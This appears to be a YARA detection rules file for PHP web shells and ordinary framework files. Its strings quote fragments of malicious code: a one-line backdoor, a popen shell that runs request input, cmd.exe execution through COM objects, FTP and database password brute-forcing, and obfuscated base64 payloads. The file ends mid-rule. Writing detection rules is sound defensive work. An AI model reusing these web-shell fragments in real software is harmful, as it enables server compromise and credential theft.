      $x1 = "<?php Echo (gzuncompress(base64_decode('eF5MmseutFyWpud9FaW/S8pWUd0QEDi1eoD33qOUUtjAe3/1zVdZgxwgDuxNxDZrvet5D/Hvyb5V/5iSdf23//dv" ascii
      $s2 = "UMfS1FFGFxGVN+xPb8ZIrUnXOKW5t60bXigM+EiJ24C20YIEFGD/7UJdsyhMlW8yp9j/+f8Lof/7Qpl//veff//zr//7DyRwRDo='))); ?>" fullword ascii
      $s3 = "cMySlFD9cx/lpCbGeTsYKb7hUKJ5gi4QdKXmxTUi2EzvfFvuQVN7AKaIjmbwyGiBI5E7kSAMHzHpaky7DSCYqXn9iqcOzmfEOyXCR4wLu76Z6uI4KQA8EqM53cF+rpd9" ascii
      $s4 = "4jq/48Vy33gsHFTJKYhWfdYJdv3awQ8F29VT4NkWU620Z6uOmBe+//YkhravkwRnKtlfeoi14Y5CH3sgET903v4iHkFZ+kr9HBgdKrUB1xtXeBgBKyNFZSLrsSy89fY7" ascii
      $s5 = "bbGS2e7XVLviAoc1G0dBA3sJpoRBLIzw+ixPBG+U64e88DBs8/Eh1geTD9HA+3pRpbxHsh0ZnJ8oNU0Wl+UXHBwQMYCBcKaw8yZb8EJjWcSIB7/IZWLvJ6iVbJEtFvYX" ascii
      $s6 = "XeGF4FJochIOYCqNilCmgF5DEhga8NNce6uc9vdt4U2yO4Sw+Sz7IJTbGCl7KJCGAYawCRO/GhpdLlOfUKssA05OldPyQzd817+ryTOy+72uvDwOiDWaUF4UmHTOkydp" ascii
      $s7 = "MyGVaDCx2/zYemiCr7vDNgYn1fl1nloghICYYcQmkM+M+x/hMVg9siQuUjd/KlcLBlVhPLXiTa6SzSqRDTaNlWpNaLetSvFnApkDonjrQ8ne7w0Lja5OaB/ROr+VK/IE" ascii
      $s8 = "AsLxb8P3kpZCDcOpW950fnoimlen96i8cY/UFZc3Tkr2Gx+QDLlKciGxv70vrzb6u+cz19/zQGGu4s4YXc0Bz0aVh1lKPGXTDASpPGwGOBiFLmfEGVHl49jfVp4zrgoL" ascii
      $s9 = "tLjPE43fJsdC4tuCJROlx/Fasg1oQJatsX3Fx8C8KSe9Bm1vfyNiUfnHbVsmS42Yf07vK4xUElQbcTHqcLAnxrhIwkcHt7tzJzmeaoA9/zK2ifXbSinemrnGYKD65hpT" ascii
      $s10 = "amQ5C9PM58Zch+TKDiHGNCCT3QRp99YEUzk5RSaHcQw040PGWpPEu3NLRiYjtV7TxdcvC5ympFn4ssXuqNQN4arfGaa+pFmkAHwni/OXt+Y7Nkal5cmdhluq3zZqmxL6" ascii
      $s11 = "IAe/3WeLNID6MvGj7BxeEh0OCH4QAPNMiKJ5aPMu80aCOmrribqBEVU/1DuL8/iO9rQSXxqAjU/3qewDkuMerDy8Xrs8RYSyRq+C00paliEZAHQc1ouz0SXHirfXdb1G" ascii
      $s12 = "OCt8qz75rqIgI96/3slzVszuKZh9BE0comotzrIrYfPArrjnKNNGK5fIHy+MAi0ogc43tEHj3TjyWZQOR8ZOddPDKoWL4h4+2e7+wjG9PjyZUk05s8UCGaFNxWhs3Ht8" ascii
      $s13 = "etJ7hC9uLBIngmA3vp72use6LeWv+7MaZMxwzs1UnuG1PTTV7N30SyG3z2yDM7Xi9rLFWmuf5hynVaC1gknKA6XmwqJRqs2z4UErkq6J1RKP5e25OQLqLL0W41edB1bB" ascii
      $s14 = "fLwqL/bR2X5TvT6G1K7p3vnRMBS5UInJbl1l3ZpLkPEcVgrNFy55lngG2rH5gUwdLiuMzVyq2fi3Y/wm9vQyHlKEyclAIXnHLunOih2PoDoY9Xvsh9Nq34yZr+xStwgD" ascii
      $s15 = "nva9VVskpVQv3dfEj//58omSSLb/tCCGJ7UgE9E925uk00LCTNYqAQyccnZ5NeIITTDU/IBLLTZ74oUT8r79hK7fpxFqUfW/TQlXQKL5m2vNFRnlelLAfHj0QR/QK7sG" ascii
      $s16 = "PIdXyyqKWH3M5uIKI7hbZ/uT9j//3AoAwbYlZ/1I92wYU5Lli4tZ2KQFCJS5k+PjUJOYSLhgTFKg85BYIBgEiOfbDuAQjp8ZRZrPkL3Iig6tDBiWrplewdmBEMe/cfWI" ascii
      $s17 = "FfeQOxjJ8jFbCYMeZyRtpHgXv18Qv2ch2nspOzyZX//md2d+CdkvtKVBXkuxOF1KrbYLgCmydVfZZnIWZBqbAvoajOqbFVNreCLTRiZ/fJCHgOr+DWjBlSS1E5skWqgo" ascii
      $s18 = "D4x+3oenpfj9YymmLsmK//UX+H/+Ayz++s+//n5h6N8vHHvPn/dg/n7BxHvG33vUeybfg3sP7J9tf/rg338+81/94P++h/zzHvL2Q952lH+v/7sf9qftX65h4m9o+iHL" ascii
      $s19 = "fyEQgefQNyNyHEW/RZJ+igT7EklaJBD2Xv71f//Hv2djNy5/Ov/PvET/3MiLMtm77R9JttXj8Lb8ja+7YtWS4W//0rqvxT+SJrne9m3Zi39pyapkWYvtz4NBPeTjuf7v" ascii
      $s20 = "b/lJ1+dy0qJZKMsmvULvB0xxs9KtqMy3B0iDfYuFw+gaP/1BfJVshHRE1tLfRSNbicK+ij03XZ5vvgCeCRimB54LcMgPHZEZLnV6RByq0YtRdUgfU1iDVzaoZeJx+pip" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule phpmailer_lang_pt_br
{
   meta:
      description = "php22 - file phpmailer.lang-pt_br.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c553c95c58b282d41b870099b7bc25505216fbba2923e82a200c9901d28e7b99"
   strings:
      $s1 = "* @author Paulo Henrique Garcia <paulo@controllerweb.com.br>" fullword ascii
      $s2 = "* @author Phelipe Alves <phelipealvesdesouza@gmail.com>" fullword ascii
      $s3 = "* Brazilian Portuguese PHPMailer language file: refer to English translation for definitive list" fullword ascii
      $s4 = "$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP Connect() falhou.';" fullword ascii
      $s5 = "$PHPMAILER_LANG['recipients_failed']    = 'Erro de SMTP: Os seguintes destinat" fullword ascii
      $s6 = "$PHPMAILER_LANG['connect_host']         = 'Erro de SMTP: N" fullword ascii
      $s7 = "$PHPMAILER_LANG['smtp_error']           = 'Erro de servidor SMTP: ';" fullword ascii
      $s8 = "vel executar: ';" fullword ascii
      $s9 = "$PHPMAILER_LANG['execute']              = 'N" fullword ascii
      $s10 = "vel conectar ao servidor SMTP.';" fullword ascii
      $s11 = "es <lucas@lucasguimaraes.com>" fullword ascii
      $s12 = "$PHPMAILER_LANG['data_not_accepted']    = 'Erro de SMTP: Dados rejeitados.';" fullword ascii
      $s13 = "$PHPMAILER_LANG['mailer_not_supported'] = ' mailer n" fullword ascii
      $s14 = "* @author Lucas Guimar" fullword ascii
      $s15 = "$PHPMAILER_LANG['from_failed']          = 'Os seguintes remententes falharam: ';" fullword ascii
      $s16 = "$PHPMAILER_LANG['authenticate']         = 'Erro de SMTP: N" fullword ascii
      $s17 = "deve informar pelo menos um destinat" fullword ascii
      $s18 = "vel definir ou redefinir a vari" fullword ascii
      $s19 = "suportado.';" fullword ascii
      $s20 = "$PHPMAILER_LANG['invalid_address']      = 'Endere" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule RandomGenerator
{
   meta:
      description = "php22 - file RandomGenerator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3c58b1c2b5e5c42105b6488c5d2ce056b44fe5cba6015d9ec37bea7e7ddbf6f4"
   strings:
      $x1 = "* in the database as a plain text but encrypt it with Member::encryptWithUserSettings." fullword ascii
      $s2 = "* If you are using it as a password equivalent (e.g. autologin token) do NOT store it" fullword ascii
      $s3 = "* @param string $algorithm Any identifier listed in hash_algos() (Default: whirlpool)" fullword ascii
      $s4 = ". 'https://docs.silverstripe.org/en/getting_started/server_requirements/'" fullword ascii
      $s5 = "* Convenience class for generating cryptographically secure pseudo-random strings/tokens" fullword ascii
      $s6 = "* Generates a random token that can be used for session IDs, CSRF tokens etc., based on" fullword ascii
      $s7 = "* @return string A 128-character, randomly generated ASCII string" fullword ascii
      $s8 = "* @return string Returned length will depend on the used $algorithm" fullword ascii
      $s9 = "* @throws Exception If no suitable CSPRNG is installed" fullword ascii
      $s10 = "* hash algorithms." fullword ascii
      $s11 = "return hash($algorithm, $this->generateEntropy());" fullword ascii
      $s12 = "public function randomToken($algorithm = 'whirlpool')" fullword ascii
      $s13 = "'It appears there is no suitable CSPRNG (random number generator) installed. '" fullword ascii
      $s14 = "throw $e; // This is required so that Error exceptions in PHP 5 aren't caught below" fullword ascii
      $s15 = ". 'Please review the server requirements documentation: '" fullword ascii
      $s16 = "return bin2hex(random_bytes(64));" fullword ascii
      $s17 = "namespace SilverStripe\\Security;" fullword ascii
      $s18 = "public function generateEntropy()" fullword ascii
      $s19 = "use Error;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule php22_qiang4
{
   meta:
      description = "php22 - file qiang4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e41981cddacc4cf025a40f69ffe42006e798072a6bdc5a1fd66d17b003906e0"
   strings:
      $s1 = "<?php ${'_'.$_}['_'](${'_'.$_}['__']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PrefixMatcherSpec
{
   meta:
      description = "php22 - file PrefixMatcherSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4eef2fbe9564649cad35f06514f0614db87877db70817a2563822285595bc7fe"
   strings:
      $s1 = "if ($expected !== $matcher->getFailureMessage(true)) {" fullword ascii
      $s2 = "if ($expected !== $matcher->getFailureMessage()) {" fullword ascii
      $s3 = "context('getFailureMessage', function() {" fullword ascii
      $s4 = "it('lists the expected prefix with negated logic', function() {" fullword ascii
      $s5 = "throw new \\Exception('Did not return expected failure message');" fullword ascii
      $s6 = "it('returns false if the subject does not contain the prefix', function() {" fullword ascii
      $s7 = "it('returns true if the subject contains the prefix', function() {" fullword ascii
      $s8 = "throw new \\Exception('Does not implement MatcherInterface');" fullword ascii
      $s9 = "$expected = 'Expected \"TEST123\" to start with \"test\"';" fullword ascii
      $s10 = "$expected = 'Expected \"test123\" not to start with \"test\"';" fullword ascii
      $s11 = "it('implements the MatcherInterface', function() {" fullword ascii
      $s12 = "use pho\\Expectation\\Matcher\\MatcherInterface;" fullword ascii
      $s13 = "it('lists the expected prefix', function() {" fullword ascii
      $s14 = "if (!($matcher instanceof MatcherInterface)) {" fullword ascii
      $s15 = "use pho\\Expectation\\Matcher\\PrefixMatcher;" fullword ascii
      $s16 = "throw new \\Exception('Does not return true');" fullword ascii
      $s17 = "throw new \\Exception('Does not return false');" fullword ascii
      $s18 = "if ($matcher->match('TEST123')) {" fullword ascii
      $s19 = "if (!$matcher->match('test123')) {" fullword ascii
      $s20 = "$matcher = new PrefixMatcher('test');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule OrderingTranslationFilesFinder
{
   meta:
      description = "php22 - file OrderingTranslationFilesFinder.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "25fba329ddf3ecd62826e2b3abc0cbdc40764bbec469e8fd9a4bb6de2647c41c"
   strings:
      $s1 = "return strpos($secondFile, 'translations') - strpos($firstFile, 'translations');" fullword ascii
      $s2 = "* @param TranslationFilesFinderInterface $translationFilesFinder" fullword ascii
      $s3 = "* @var TranslationFilesFinderInterface" fullword ascii
      $s4 = "public function __construct(TranslationFilesFinderInterface $translationFilesFinder)" fullword ascii
      $s5 = "usort($files, function (string $firstFile, string $secondFile) use ($path): int {" fullword ascii
      $s6 = "$files = $this->translationFilesFinder->findTranslationFiles($path);" fullword ascii
      $s7 = "$this->translationFilesFinder = $translationFilesFinder;" fullword ascii
      $s8 = "namespace Sylius\\Bundle\\ThemeBundle\\Translation\\Finder;" fullword ascii
      $s9 = "public function findTranslationFiles(string $path): array" fullword ascii
      $s10 = "private $translationFilesFinder;" fullword ascii
      $s11 = "$secondFile = str_replace($path, '', $secondFile);" fullword ascii
      $s12 = "$firstFile = str_replace($path, '', $firstFile);" fullword ascii
      $s13 = "final class OrderingTranslationFilesFinder implements TranslationFilesFinderInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php_shell_popen
{
   meta:
      description = "php22 - file php-shell-popen.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "87fcab36f87d3a259b08b6617448472dffa6378abca49dbf6f5ae8172dd0710e"
   strings:
      $s1 = "echo fread($handle,1024*4);" fullword ascii
      $s2 = "$handle = popen($_REQUEST['code'],'r');" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule PageTemplate
{
   meta:
      description = "php22 - file PageTemplate.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d41e6475230bf61c514d62efbeed06a49db44b3d0a9b7e8860ac1f93d251c939"
   strings:
      $s1 = "return $template->getPageTemplateDisplayName();" fullword ascii
      $s2 = "return Template::getListByPackage($package);" fullword ascii
      $s3 = "defined('C5_EXECUTE') or die(\"Access Denied.\");" fullword ascii
      $s4 = "public function getItemName($template)" fullword ascii
      $s5 = "class PageTemplate extends AbstractCategory" fullword ascii
      $s6 = "use Concrete\\Core\\Page\\Template;" fullword ascii
      $s7 = "public function getPackageItems(Package $package)" fullword ascii
      $s8 = "return t('Page Templates');" fullword ascii
      $s9 = "use Concrete\\Controller\\Element\\Package\\ThemeItemList;" fullword ascii
      $s10 = "public function getItemCategoryDisplayName()" fullword ascii
      $s11 = "use Concrete\\Core\\Entity\\Package;" fullword ascii
      $s12 = "namespace Concrete\\Core\\Package\\ItemCategory;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule php22_PHVayv
{
   meta:
      description = "php22 - file PHVayv.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2f1eb3815669593696f87abcb418c84e8d0708c3831e11a49772a2030f9e5738"
   strings:
      $s1 = "<form method=\"POST\" action=\"<?php echo \"PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin\"?>\" name=\"kaypos\">" fullword ascii
      $s2 = "<form method=\"POST\" action=\"<?php echo \"$fistik.php?yeniklasor=1&dizin=$dizin\"?>\" " fullword ascii
      $s3 = "<img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
      $s4 = "<form method=\"POST\" action=\"<?php echo \"$fistik.php?yenidosya=1&dizin=$dizin\"?>\" " fullword ascii
      $s5 = "<a href=\"<?php echo \"$fistik\";?>.php?sildos=<?php echo $ekinci;?>&dizin=<?php echo $dizin;?>\" style=\"text-decoration: no" fullword ascii
      $s6 = "<a href=\"<?php echo \"$fistik.php?dizin=$dizin/\" ?><?php echo \"$ekinci\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s7 = "<a href=\"<?php echo \"$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin\"?>\" style=\"text-decoration: none\">" fullword ascii
      $s8 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
      $s9 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
      $s10 = "00000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s11 = "<a href=\"<?php echo \"$fistik.php?yenklas=1&dizin=$dizin\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s12 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
      $s13 = "<td rowspan=\"2\" height=\"19\"><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?php echo \"$dizin/$duzenle\"?></font><" fullword ascii
      $s14 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s15 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #0" fullword ascii
      $s16 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
      $s17 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
      $s18 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s19 = "<a href=\"http://www.aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
      $s20 = "<a color=\"#9F9F9F\" target=\"_blank\" href=\"<?php echo \"$fistik.php?sistembilgisi=1\";?>\" style=\"text-decoration: none\"><f" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule PasswordEncryptor_LegacyPHPHash
{
   meta:
      description = "php22 - file PasswordEncryptor_LegacyPHPHash.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "86fd5871226796b5f3e829d76545a070578256fab5956685c40f542f12774065"
   strings:
      $s1 = "return (substr($hash, 0, 10) === substr($this->encrypt($password, $salt, $member), 0, 10));" fullword ascii
      $s2 = "class PasswordEncryptor_LegacyPHPHash extends PasswordEncryptor_PHPHash" fullword ascii
      $s3 = "* See http://open.silverstripe.org/ticket/3004" fullword ascii
      $s4 = "public function encrypt($password, $salt = null, $member = null)" fullword ascii
      $s5 = "$password = parent::encrypt($password, $salt, $member);" fullword ascii
      $s6 = "* which had a design flaw in password hashing that caused" fullword ascii
      $s7 = "// Convert the base of the hexadecimal password to 36 to make it shorter" fullword ascii
      $s8 = "* Legacy implementation for SilverStripe 2.1 - 2.3," fullword ascii
      $s9 = "* the hashes to differ between architectures due to" fullword ascii
      $s10 = "// In that way we can store also a SHA256 encrypted password in just 64" fullword ascii
      $s11 = "public function check($hash, $password, $salt = null, $member = null)" fullword ascii
      $s12 = "// Legacy fix: This shortening logic is producing unpredictable results." fullword ascii
      $s13 = "* floating point precision problems in base_convert()." fullword ascii
      $s14 = "return substr(base_convert($password, 16, 36), 0, 64);" fullword ascii
      $s15 = "// only the first 10 characters are consistently useful for comparisons." fullword ascii
      $s16 = "// Due to flawed base_convert() floating poing precision," fullword ascii
      $s17 = "namespace SilverStripe\\Security;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule RC_Shell
{
   meta:
      description = "php22 - file RC-Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "91c44cb03a002351f92a853b5233ccbe455a056902e13c6eb4dafd0e483fb831"
   strings:
      $x1 = "</script>'; } function z3w($var,$f){ $val=''; if(!empty($f)){ $reg='/\\$'.$var.'\\s*=\\s*([\\'\"]{1})([^\\1\\s\\t\\r\\n]+)\\1\\s" ascii
      $x2 = "function z9s($k, $w='',$u=0){ global $lang; $l=z7x(2, \"language\"); $r = ''; if(!isset($lang[$l][$k])) return \"?\"; $r = $lang" ascii
      $x3 = "'; } function z3x($login=0){ $tc=''; foreach(z7x(5,'skins') as $s) $tc .= z5c(array('act','d','color_skin'=>$s), z4p(z0g(z9w(\"t" ascii
      $x4 = "b='kernel32.dll'] int WinExec(char *APP,int SW);\"); $r=$a->WinExec(\"cmd.exe /c \".z6l($c).\" >\\\"$o\\\"\",0); while(!@file_ex" ascii
      $x5 = "sleep(1); $r=z9p($o); } else { $a = new COM(\"WScript.Shell\"); $a->Run('c:\\\\windows\\\\system32\\\\cmd.exe /c '.z6l($c).' > " ascii
      $x6 = "@win_shell_execute('..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe /c '.z6l($c).' > \"'.$o.'\"'); whil" ascii
      $x7 = "time); if($res==\"valid\"){ echo \"[+] $user:\".z9i($pass).\" - success\\r\\n\"; $log.=\"ftp://$host:$port - $user \".z9i($pass)" ascii
      $x8 = "($res==\"valid\"){ echo \"[+] $user:\".z9i($user).\" - success\\r\\n\"; $log.=\"ftp://$host:$port - $user \".z9i($user).\"\\r\\n" ascii
      $x9 = "] $user:\".@strrev($user).\" - success\\r\\n\"; $log.=\"ftp://$host:$port - $user \".@strrev($user).\"\\r\\n\"; $success++; } } " ascii
      $x10 = "st,$user,$user.\"123\",$port,$time); if($res==\"valid\"){ echo \"[+] $user:\".$user.\"123 - success\\r\\n\"; $log.=\"ftp://$host" ascii
      $x11 = "isplay'=>$s,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c \".z6l($c).\" >\\\"$o\\\"\")); @win32_start_service($s" ascii
      $x12 = "$res=z4u($host,$user,$pass.\"123\",$port,$dbtype,$sqldb); if($res==\"valid\"){ echo \"[+] $user:\".$pass.\"123 - success\\r\\n\"" ascii
      $x13 = "$pass),$port,$dbtype,$sqldb); if($res==\"valid\"){ echo \"[+] $user:\".z9i($pass).\" - success\\r\\n\"; $log.=\"$dbtype - $host:" ascii
      $x14 = "er.\"123\",$port,$dbtype,$sqldb); if($res==\"valid\"){ echo \"[+] $user:\".$user.\"123 - success\\r\\n\"; $log.=\"$dbtype - $hos" ascii
      $x15 = "ser:\".@strrev($pass).\" - success\\r\\n\"; $log.=\"$dbtype - $host:$port - $pass \".@strrev($user).\"\\r\\n\"; $success++; } if" ascii
      $x16 = "pe,$sqldb); if($res==\"valid\"){ echo \"[+] $user:\".z9i($user.\"123\").\" - success\\r\\n\"; $log.=\"$dbtype - $host:$port - $u" ascii
      $x17 = "ldb); if($res==\"valid\"){ echo \"[+] $user:\".z9i($user).\" - success\\r\\n\"; $log.=\"$dbtype - $host:$port - $user \".z9i($us" ascii
      $x18 = "ss\\r\\n\"; $log.=\"ftp://$host:$port - $user \".$user.\"1\\r\\n\"; $success++; } } if($res!=\"valid\"&&$try3==\"1\"){ $count++;" ascii
      $x19 = "get($file,$dest='',$t=0){ if($dest=='') $dest=$this->downloadDir; return @ftp_get($this->connection,($t?$dest:z1a($dest).z2h($f" fullword ascii
      $x20 = "BASES;\\nSELECT * FROM user;\"; if(!@isset($q_sql_filename)) $q_sql_filename=$tempdir.\"dump_\".@getenv(\"SERVER_NAME\").\"_db_" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 900KB and
      1 of ($x*)
}

rule page_owner
{
   meta:
      description = "php22 - file page_owner.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7ac3b04f9ec2aadbe4e8743fea2b92378fbd9ee171022b08d7f55ea98d056ee3"
   strings:
      $s1 = "<?php defined('C5_EXECUTE') or die(\"Access Denied.\"); ?>" fullword ascii
      $s2 = "$('#ccm-permissions-access-entity-label').html('<div class=\"alert alert-info\">' + r.label + '</div>');" fullword ascii
      $s3 = "<?php $url = $type->getAccessEntityTypeToolsURL(); ?>" fullword ascii
      $s4 = "$('#ccm-permissions-access-entity-form input[name=peID]').val(r.peID);" fullword ascii
      $s5 = "$.getJSON('<?=$url?>', function(r) {" fullword ascii
      $s6 = "$('#ccm-permissions-access-entity-form .btn-group').removeClass('open');" fullword ascii
      $s7 = "ccm_choosePermissionAccessEntityPageOwner = function() {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_persian
{
   meta:
      description = "php22 - file persian.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "de7bacd36213eb7508a36f3e29bbf7cae3594602c1199500d1c8d8003f19af57"
   strings:
      $s1 = "/* Translated by Moslem Mansouri www.itkak.com +989163996607 */" fullword ascii
      $s2 = "$lang['alert_delete_multiple'] = 'Are you sure that you want to delete those {items_amount} items?';" fullword ascii
      $s3 = "$lang['alert_delete_multiple_one'] = 'Are you sure that you want to delete this 1 item?';" fullword ascii
      $s4 = "/* Added in version 1.2.1 */" fullword ascii
      $s5 = "/* Added in version 1.3.1 */" fullword ascii
      $s6 = "/* Added in version 1.5.1 */" fullword ascii
      $s7 = "/* Added in version 1.5.6 */" fullword ascii
      $s8 = "/* Added in version 1.4 */" fullword ascii
      $s9 = "/* Added in version 1.2.2 */" fullword ascii
      $s10 = "/* Added in version 1.5.8 */" fullword ascii
      $s11 = "/* Added in version 1.5.2 */" fullword ascii
      $s12 = "/* Added in version 1.6.1 */" fullword ascii
      $s13 = "/* Javascript messages */" fullword ascii
      $s14 = "/* Upload functionality */" fullword ascii
      $s15 = "$lang['error_on_uploading'] " fullword ascii
      $s16 = "$lang['error_max_number_of_files'] " fullword ascii
      $s17 = "$lang['error_accept_file_types'] " fullword ascii
      $s18 = "$lang['error_max_file_size'] " fullword ascii
      $s19 = "$lang['delete_error_message'] " fullword ascii
      $s20 = "$lang['error_min_file_size'] " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule php22_Posts
{
   meta:
      description = "php22 - file Posts.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2e5dcf9555a879538f27a957bbef2759977cae2aef1244752cd9285df6dd2d04"
   strings:
      $s1 = "->withStatus(__d('content', 'The {0} <b>#{1}</b> was successfully deleted.', $postType->label('name'), $post->id), 'success');" fullword ascii
      $s2 = "$status = __d('content', 'The {0} <b>#{1}</b> was successfully restored to the revision: <b>{2}</b>', $postType->label('" fullword ascii
      $s3 = "$name = Config::get('content::labels.' .$type .'.name', Str::title($type));" fullword ascii
      $s4 = "->withStatus(__d('content', 'The {0} <b>#{1}</b> was successfully deleted.', $postType->label('name'), $post->id), '" fullword ascii
      $s5 = "$status = __d('content', 'The {0} <b>#{1}</b> was successfully saved.', $postType->label('name'), $post->id);" fullword ascii
      $s6 = "->shares('title', __d('content', 'Revisions of the {0} : {1}', $name, $post->title));" fullword ascii
      $s7 = "$post->meta->edit_lock = sprintf('%d:%d', time(), $authUser->id);" fullword ascii
      $s8 = "$statuses = Config::get('content::statuses', array());" fullword ascii
      $s9 = "$post->meta->edit_lock = sprintf('%d:%d', time(), $userId);" fullword ascii
      $s10 = "$result = '<option value=\"0\"' .(($parentId == 0) ? ' selected=\"selected\"' : '') .'>' .__d('content', '(no parent)') " fullword ascii
      $s11 = "// Save the Post instance before to process the Categories and Tags." fullword ascii
      $s12 = "$results = Event::fire('content.editor.stylesheets.' .Str::snake($theme), array($theme));" fullword ascii
      $s13 = "$title = __d('content', 'Posts in the {0} : {1}', $name, $taxonomy->name);" fullword ascii
      $s14 = "use App\\Modules\\Content\\Support\\PostType;" fullword ascii
      $s15 = "'comment_status' => ($type == 'post') ? 'open' : 'closed'," fullword ascii
      $s16 = "Session::pushStatus(__d('content', 'Record not found: #{0}', $id), 'danger');" fullword ascii
      $s17 = "Event::fire('content.post.updating', array($post, $creating));" fullword ascii
      $s18 = "Event::fire('content.post.updated', array($post, $creating));" fullword ascii
      $s19 = "$revision = Post::with('parent')->where('type', 'revision')->findOrFail($id);" fullword ascii
      $s20 = "return $this->createView(compact('type', 'name', 'statuses', 'posts'), 'Index')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule ProductPriceEvent
{
   meta:
      description = "php22 - file ProductPriceEvent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0bf92960f853f30ef1e5d42a36a79c24938e617ae589ddd314fc73d4852a20e2"
   strings:
      $s1 = "use app\\modules\\core\\events\\SpecialEvent;" fullword ascii
      $s2 = "namespace app\\modules\\shop\\events;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Pinoy_LULZSec_Private_Shell_2017
{
   meta:
      description = "php22 - file Pinoy-LULZSec-Private-Shell-2017.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "36a8125694531fe629073bbad1907193a830110678feee5253bd93e61bb2b72e"
   strings:
      $s1 = "YZkEvZFZsYUdFb25Nd3ZLOGRKd2VFamg1MkFTZmlkQUJIYnVzRUNsbjR6TkUvMy9EZVBpTzBtVE1EK0lL" fullword ascii
      $s2 = "Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/" fullword ascii
      $s3 = "5QVE1YldsMGg4K1pLdllNYXBkN3dQa3ZqcmRFdldsUEt5QW1MQnF2aENSLzg2eFdXM3NJYW1yRTdYNzUz" fullword ascii
      $s4 = "TeXRlZnRKckluSk83aFFYMVQ5QUgwd1g5dU5LNlJ1M2hGblp2cUxFUDlLallEQStMN1dpU2t1QThQQTRP" fullword ascii
      $s5 = "xeFpKUGhJQWxQUEJZSWp0cHUyZEIzMVFFeitkVXhYV1lueWxZQWRzbWp4c00rb3FuRVl4TmU0NWlXVXV5" fullword ascii
      $s6 = "5Tml4Rkp5LzdZT2k1bU9NWnhldllhRytDdjdTc3RwczhkS1VhYWlEVVh5T1NJdEUyUGE1ZVpsem9LSnhh" fullword ascii
      $s7 = "WU1YwZXFoWGpKQW9XaFBsMEZPazhIQ3U3a0p4alBCbUdlZnpMS3d1Rk5nbWg0dllLUHFzVEdDTUZBT29y" fullword ascii
      $s8 = "TUys4bGx3dCtOeVJBR2NhOStUUDZYUFlFOGtiZ0twOUFNSVFLNWZpTWFUTjhPNnFxdEJtVGtRSnV6OGFE" fullword ascii
      $s9 = "QcFJTQ2p6SklCM2hlOGM2bFRjV0JCWmN0K2pZV3UycWUxNS9RQ05UN0pOZXVtOHZONEE4bEhUcE45dG9V" fullword ascii
